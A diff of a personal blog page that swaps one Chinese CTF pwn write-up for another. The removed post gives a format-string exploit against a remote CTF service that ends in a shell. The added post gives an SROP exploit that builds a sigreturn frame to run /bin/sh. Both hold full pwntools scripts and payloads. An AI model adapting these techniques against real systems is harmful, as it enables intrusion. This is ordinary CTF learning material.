@@ -10,7 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="npuctf_2020_level">
+        <meta name="description" content="nkctf ez_stack(srop)">
     
 
     <!--Author-->
@@ -20,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="npuctf_2020_level2"/>
+        <meta property="og:title" content="nkctfez_stack"/>
     
 
     <!--Open Graph Description-->
@@ -45,7 +45,7 @@
 
     <!-- Title -->
     
-    <title>npuctf_2020_level2 - b4nd1t</title>
+    <title>nkctfez_stack - b4nd1t</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -151,13 +151,13 @@
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/2023/03/18/pwn1/">
-                npuctf_2020_level2
+            <a href="/2023/03/27/nkctfez-stack/">
+                nkctfez_stack
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2023-03-18</span>
+                <span class="date">2023-03-27</span>
             
             
             
@@ -174,20 +174,16 @@
         
 
         <!-- Post Content -->
-        <h1 id="npuctf-2020-level"><a href="#npuctf-2020-level" class="headerlink" title="npuctf_2020_level"></a>npuctf_2020_level</h1><span id="more"></span>
+        <h1 id="nkctf-ez-stack-srop"><a href="#nkctf-ez-stack-srop" class="headerlink" title="nkctf ez_stack(srop)"></a>nkctf ez_stack(srop)</h1><span id="more"></span>
 
-<h2 id="1-保护检查"><a href="#1-保护检查" class="headerlink" title="1.保护检查"></a>1.保护检查</h2><p><img src="/../img/1679122312736.png" alt="1679122312736"></p>
-<h2 id="2-源代码分析"><a href="#2-源代码分析" class="headerlink" title="2.源代码分析"></a>2.源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0x64uLL);</span><br><span class="line">    if ( !strcmp(buf, &quot;66666666&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    printf(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h2><p><img src="/../img/1679890198393.png" alt="1679890198393"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><img src="/../img/1679890300355.png" alt="1679890300355">                   </p>
+<p><img src="/../img/1679890326458.png" alt="1679890326458"></p>
+<p>第一次的payload<code>payload = &#39;a&#39;*0x10 + p64(0) + p64(syscall_ret) + p64(syscall_read) + p64(0) + p64(syscall_read_xor)</code></p>
+<p>按照程序中的代码到最后rax会被置零，返回到syscall_ret时还会进行输入，我们输入一个字符，这样rax就会存入返回值1，这时再调用到syscall_read就会打印0x200个字符，在其中泄露出栈上的一个地址，在接近返回的时候有一个<code>pop rbp</code>，用p64（0）进行填充，再返回的时候就又可以输入了。</p>
+<p>第二次的payload<code>payload = &quot;/bin/sh\x00&quot; * 3 + p64(mov_rax) + p64(syscall_ret) + str(frame)</code>,把&#x2F;bin&#x2F;sh写入栈中，利用刚才泄露的栈地址计算出&#x2F;bin&#x2F;sh的位置</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = process(&quot;./pwn&quot;)</span><br><span class="line">syscall_read_xor = 0x00000000004011DC</span><br><span class="line">syscall_read = 0x00000000004011DF</span><br><span class="line">syscall_ret = 0x00000000040114E</span><br><span class="line">syscall = 0x00000000004011DA</span><br><span class="line">mov_rax = 0x401146</span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">payload = &#x27;a&#x27;*0x10 + p64(0) + p64(syscall_ret) + p64(syscall_read) + p64(0) + p64(syscall_read_xor)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#pause()</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.send(&quot;a&quot;)</span><br><span class="line">stack_addr = u64(p.recv(40)[-8:])</span><br><span class="line">print(hex(stack_addr))</span><br><span class="line">p.recv()</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 59</span><br><span class="line">frame.rdi = stack_addr - 0xa2</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rbp = stack_addr</span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall</span><br><span class="line">payload = &quot;/bin/sh\x00&quot; * 3 + p64(mov_rax) + p64(syscall_ret) + str(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>非栈上的格式化字符串漏洞，输入66666666会退出</p>
-<p><img src="/../img/1679122797888.png" alt="1679122797888"></p>
-<p>在0x7fffffffdf88处有一条rbp链可用</p>
-<p>0x7fffffffdf70处和0x7fffffffdf78处分别可以泄露程序加载基址和libc加载基址</p>
-<p>0x7fffffffdf88在第9个参数的位置，0x7fffffffe058在第35个参数的位置。</p>
-<p>思路是将0x7fffffffe058处所存的0x7fffffffe388改到返回地址的地方，再把返回地址改成onegadget的地址就可以拿到shell。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = process(&quot;./buu&quot;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25110)</span><br><span class="line">libc = ELF(&quot;u1864.so&quot;)</span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">buf_offset = 0x201040</span><br><span class="line">payload = &quot;%6$p%7$p%9$p&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">base = int(p.recv(14),16) - 0x830</span><br><span class="line">print(hex(base))</span><br><span class="line">libcbase = int(p.recv(14),16) - libc.sym[&#x27;__libc_start_main&#x27;] - 231</span><br><span class="line">print(hex(libcbase))</span><br><span class="line">stack_addr = int(p.recv(14),16) - 0xe0</span><br><span class="line">num1 = (stack_addr &amp; 0xffff)</span><br><span class="line">onegadget = [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">og = libcbase + onegadget[0]</span><br><span class="line">buf_addr = base + buf_offset</span><br><span class="line">payload = &quot;%&quot; + str(num1) + &quot;c%9$hn&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#print(hex(libc.sym[&#x27;__libc_start_main&#x27;]))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &quot;%&#123;&#125;c%35$hn&quot;.format(og &amp; 0xffff)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &quot;%&#123;&#125;c%9$hhn&quot;.format((num1 &amp; 0xff) + 2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &quot;%&#123;&#125;c%35$hn&quot;.format((og &gt;&gt; 16) &amp; 0xffff)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &quot;66666666&quot; + &quot;\x00&quot; * 8</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;cat flag&quot;)</span><br><span class="line">#debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/1679138627884.png" alt="1679138627884"></p>
 
     </div>
 
